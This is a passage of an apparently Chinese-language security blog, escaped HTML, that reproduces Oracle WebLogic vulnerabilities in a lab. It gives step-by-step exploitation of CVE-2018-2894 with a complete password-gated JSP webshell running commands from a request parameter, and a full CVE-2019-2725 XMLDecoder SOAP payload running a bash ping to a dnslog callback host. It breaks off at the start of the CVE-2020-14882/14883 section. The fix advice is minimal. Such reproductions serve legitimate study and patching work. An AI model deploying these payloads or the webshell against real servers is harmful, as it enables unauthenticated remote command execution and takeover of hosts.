+&lt;h2 id=&#34;任意文件上传漏洞cve-2018-2894&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件上传漏洞cve-2018-2894&#34;&gt;#&lt;/a&gt; 任意文件上传漏洞 (CVE-2018-2894)&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞概述-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-3&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;Oracle Fusion Middleware（Oracle 融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server 是其中的一个适用于云环境和传统环境的应用服务器组件。 WebLogic 管理端未授权的两个页面存在任意上传 getshell 漏洞，可直接获取权限。两个页面分别为 &lt;code&gt;/ws_utc/begin.do&lt;/code&gt; ， &lt;code&gt;/ws_utc/config.do&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-3&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;访问漏洞位置 http://192.168.2.188:7004/ws_utc/config.do&lt;/li&gt;
+&lt;li&gt;获取账号密码 &lt;code&gt;docker-compose logs | grep password&lt;/code&gt; &lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171923808.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=qAg7P&amp;amp;originHeight=102&amp;amp;originWidth=760&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;访问 &lt;code&gt;http://192.168.2.188:7001/console/login/LoginForm.jsp&lt;/code&gt;  登录后台管理员用户名为 &lt;code&gt;weblogic&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;点击 &lt;code&gt;base_domain&lt;/code&gt;  的配置，在 &amp;quot;高级&amp;quot; 中开启 &amp;quot;启用 Web 服务测试页&amp;quot; 选项	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171934003.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=b0Dx7&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;访问 &lt;code&gt;http://192.168.44.132:7001/ws_utc/config.do&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;设置 Work Home Dir 为 &lt;code&gt;/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css&lt;/code&gt;  静态文件 css 目录，访问这个目录是无需权限的&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171937238.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=XoiIN&amp;amp;originHeight=673&amp;amp;originWidth=1432&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;构造 webshell&lt;/li&gt;
+&lt;li&gt;创建 a.jsp 内容如下请求：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3gueC54LngvYS5qc3A=&#34;&gt;http://x.x.x.x/a.jsp&lt;/span&gt;??pwd=023&amp;amp;i=whoami&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;023&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;pwd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;InputStream&lt;/span&gt; in &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;i&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2048&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;pre&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;in&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;/pre&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;8&#34;&gt;
+&lt;li&gt;然后点击 Security-&amp;gt; Add,&lt;strong&gt; 抓包&lt;/strong&gt;，然后上传 webshell 因为 weblogic 使用了时间戳_文件名进行了重命名，时间戳在返回包中&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171942467.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=IhiBz&amp;amp;originHeight=370&amp;amp;originWidth=577&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171942358.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=IM8Pt&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;然后访问 &lt;code&gt;http://192.168.2.188:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]&lt;/code&gt; ，即可执行 webshell	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171945217.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=mdwuA&amp;amp;originHeight=207&amp;amp;originWidth=1044&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;修复建议-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议-3&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
+&lt;p&gt;下载补丁:&lt;/p&gt;
+&lt;h2 id=&#34;未授权rcecve-2019-2725&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#未授权rcecve-2019-2725&#34;&gt;#&lt;/a&gt; 未授权 RCE (CVE-2019-2725)&lt;/h2&gt;
+&lt;p&gt;环境:&lt;/p&gt;
+&lt;h3 id=&#34;漏洞概述-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-4&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;CVE-2019-2725 是一个 Oracle weblogic 反序列化远程命令执行漏洞，这个漏洞依旧是根据 weblogic 的 xmldecoder 反序列化漏洞，通过针对 Oracle 官网历年来的补丁构造 payload 来绕过。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;影响版本:weblogic 10.x、weblogic 12.1.3&lt;/li&gt;
+&lt;li&gt;存在 /_async/AsyncResponseService 接口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞复现-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-4&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;访问 &lt;code&gt;/_async/AsyncResponseService&lt;/code&gt;  接口，存在如下页面，即存在漏洞	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210082238333.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=XN26S&amp;amp;originHeight=395&amp;amp;originWidth=1919&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;attck - 命令执行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;soapenv:Envelope xmlns:soapenv&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&lt;/span&gt; xmlns:wsa&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://www.w3.org/2005/08/addressing&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xmlns:asy&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://www.bea.com/async/AsyncResponseService&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;soapenv:Header&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;wsa:Action&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;xx&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/wsa:Action&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;wsa:RelatesTo&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;xx&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/wsa:RelatesTo&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;work:WorkContext xmlns:work&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;http://bea.com/2004/06/soap/workarea/&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;void &lt;span class=&#34;token assign-left variable&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;java.lang.ProcessBuilder&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;array &lt;span class=&#34;token assign-left variable&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;java.lang.String&#34;&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;void &lt;span class=&#34;token assign-left variable&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;0&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;string&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;/bin/bash&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/string&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/void&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;void &lt;span class=&#34;token assign-left variable&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;string&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;-c&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/string&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/void&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;void &lt;span class=&#34;token assign-left variable&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;string&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;ping tdjmtv.dnslog.cn&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/string&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/void&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/array&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;void &lt;span class=&#34;token assign-left variable&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;start&#34;&lt;/span&gt;/&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/void&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/work:WorkContext&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/soapenv:Header&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;soapenv:Body&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;asy:onAsyncDelivery/&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/soapenv:Body&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;/soapenv:Envelope&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180851491.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=CjVga&amp;amp;originHeight=630&amp;amp;originWidth=1175&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;修复建议-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议-4&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;升级本地 JDK 环境&lt;/li&gt;
+&lt;li&gt;及时安装官方补丁&lt;/li&gt;
+&lt;li&gt;ref:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;未认证远程命令执行cve-2020-14882-cve-2020-14883&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#未认证远程命令执行cve-2020-14882-cve-2020-14883&#34;&gt;#&lt;/a&gt; 未认证远程命令执行 (CVE-2020-14882、CVE-2020-14883)&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞概述-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-5&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;Oracle WebLogic Server 是行业领先的应用服务器，用于使用 Java EE 标准构建企业应用程序，并将它们部署在可靠、可扩展的运行时上，并且拥有成本低。&lt;/p&gt;
+&lt;p&gt;在&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9zZWN1cml0eS1hbGVydHMvY3B1b2N0MjAyMHRyYWRpdGlvbmFsLmh0bWw=&#34;&gt; Oracle 重要补丁更新公告 - 2020 年 10 月中&lt;/span&gt;，Oracle 修复了 CVE-2020-14882 和 CVE-2020-14883 来自 Chaitin Tech 的安全研究员 &lt;a href=&#34;/Voidfyoo&#34;&gt;@Voidfyoo &lt;/a&gt; 提交的两个安全漏洞。&lt;/p&gt;
+&lt;p&gt;CVE-2020-14882 允许远程用户绕过管理员控制台组件中的身份验证，CVE-2020-14883  允许经过身份验证的用户在管理员控制台组件上执行任何命令。使用这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle  WebLogic 服务器上执行任意命令并完全控制主机。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-5&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;启动完成后，访问 &lt;code&gt;http://192.168.44.132:7001/console&lt;/code&gt;  查看管理员控制台登录页面&lt;/li&gt;
